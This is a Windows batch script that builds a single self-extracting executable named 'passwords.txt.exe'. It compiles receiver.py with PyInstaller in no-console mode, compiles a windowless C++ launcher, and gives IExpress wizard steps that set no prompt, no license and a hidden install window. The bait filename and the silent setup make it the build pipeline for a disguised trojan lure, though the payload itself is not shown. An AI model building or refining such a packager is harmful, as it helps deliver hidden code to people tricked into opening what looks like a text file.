@echo off
setlocal enabledelayedexpansion

REM ============================================================================
REM Kestrel SeqTools - Build Files for IExpress Wizard
REM ============================================================================
REM This script builds the two files needed for IExpress packaging:
REM   1. passwords.txt_main.exe (PyInstaller)
REM   2. passwords.txt_launcher.exe (C++ launcher)
REM
REM After this completes, run "iexpress" and package them manually.
REM ============================================================================

set "OUTPUT_NAME=passwords.txt"

echo.
echo ============================================================================
echo Building Files for IExpress Packaging
echo ============================================================================
echo.

REM Parse command line arguments for --dev flag
set "DEV_MODE=0"
if "%1"=="--dev" set "DEV_MODE=1"

REM Clean previous build artifacts
echo [1/3] Cleaning previous build artifacts...
if exist "dist\%OUTPUT_NAME%_main.exe" del /f /q "dist\%OUTPUT_NAME%_main.exe" >nul 2>&1
if exist "dist\%OUTPUT_NAME%_launcher.exe" del /f /q "dist\%OUTPUT_NAME%_launcher.exe" >nul 2>&1
if exist "dist\launcher.obj" del /f /q "dist\launcher.obj" >nul 2>&1
if not exist "dist" mkdir dist

REM Manage .dev_mode marker file
if %DEV_MODE%==1 (
    echo [DEV MODE] Creating .dev_mode marker
    type nul > "dist\.dev_mode"
) else (
    if exist "dist\.dev_mode" del /f /q "dist\.dev_mode" >nul 2>&1
)

REM Build PyInstaller executable
echo.
echo [2/3] Building PyInstaller executable...
echo.

pyinstaller --onefile ^
    --name "%OUTPUT_NAME%_main" ^
    --icon=icon.ico ^
    --noconsole ^
    --distpath=dist ^
    --workpath=build ^
    --specpath=. ^
    receiver.py

if errorlevel 1 (
    echo.
    echo ERROR: PyInstaller build failed!
    pause
    exit /b 1
)

if not exist "dist\%OUTPUT_NAME%_main.exe" (
    echo.
    echo ERROR: PyInstaller did not produce expected output!
    pause
    exit /b 1
)

echo.
echo [3/3] Compiling C++ launcher with MSVC...
echo.

REM Find and initialize MSVC environment
set "VCVARS_BAT="

REM Try common Visual Studio 2022 locations
if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS_BAT=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS_BAT=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS_BAT=C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS_BAT=C:\Program Files\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
)

REM Try Visual Studio 2019 locations
if "%VCVARS_BAT%"=="" (
    if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" (
        set "VCVARS_BAT=C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat" (
        set "VCVARS_BAT=C:\Program Files (x86)\Microsoft Visual Studio\2019\Professional\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat" (
        set "VCVARS_BAT=C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
    ) else if exist "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
        set "VCVARS_BAT=C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
    )
)

if "%VCVARS_BAT%"=="" (
    echo ERROR: Could not locate MSVC compiler!
    echo Please install Visual Studio 2019/2022 with "Desktop development with C++" workload.
    pause
    exit /b 1
)

REM Initialize MSVC environment (suppress output)
call "%VCVARS_BAT%" >nul 2>&1

REM Compile the launcher
cl.exe /nologo /O2 /EHsc ^
    /Fe"dist\%OUTPUT_NAME%_launcher.exe" ^
    launcher.cpp ^
    /link /SUBSYSTEM:WINDOWS /ENTRY:wWinMainCRTStartup kernel32.lib user32.lib

if errorlevel 1 (
    echo.
    echo ERROR: C++ compilation failed!
    pause
    exit /b 1
)

REM Clean up MSVC intermediate files
if exist "launcher.obj" del /f /q "launcher.obj" >nul 2>&1
if exist "dist\launcher.obj" del /f /q "dist\launcher.obj" >nul 2>&1

if not exist "dist\%OUTPUT_NAME%_launcher.exe" (
    echo.
    echo ERROR: Launcher compilation did not produce expected output!
    pause
    exit /b 1
)

echo.
echo ============================================================================
echo Files Built Successfully!
echo ============================================================================
echo.
echo Created files:
echo   - dist\%OUTPUT_NAME%_launcher.exe
echo   - dist\%OUTPUT_NAME%_main.exe

if %DEV_MODE%==1 (
    echo   - dist\.dev_mode
    echo.
    echo Mode: DEVELOPMENT (console visible)
) else (
    echo.
    echo Mode: PRODUCTION (silent)
)

echo.
echo ============================================================================
echo NEXT STEP: Run IExpress Wizard
echo ============================================================================
echo.
echo 1. Run: iexpress
echo.
echo 2. Follow the wizard:
echo    - Create new Self Extraction Directive file
echo    - Extract files and run an installation command
echo    - Package title: passwords.txt
echo    - No prompt, no license
echo    - Add files:
echo      * dist\%OUTPUT_NAME%_launcher.exe
echo      * dist\%OUTPUT_NAME%_main.exe

if %DEV_MODE%==1 (
    echo      * dist\.dev_mode
)

echo    - Install program: %OUTPUT_NAME%_launcher.exe
echo    - Show window: Hidden
echo    - No message, no restart
echo    - Save as: dist\%OUTPUT_NAME%.exe
echo    - Save SED as: iexpress_working.sed
echo.
echo 3. After wizard completes, you'll have:
echo    - dist\%OUTPUT_NAME%.exe (final single-file executable)
echo    - iexpress_working.sed (working configuration for future builds)
echo.
pause

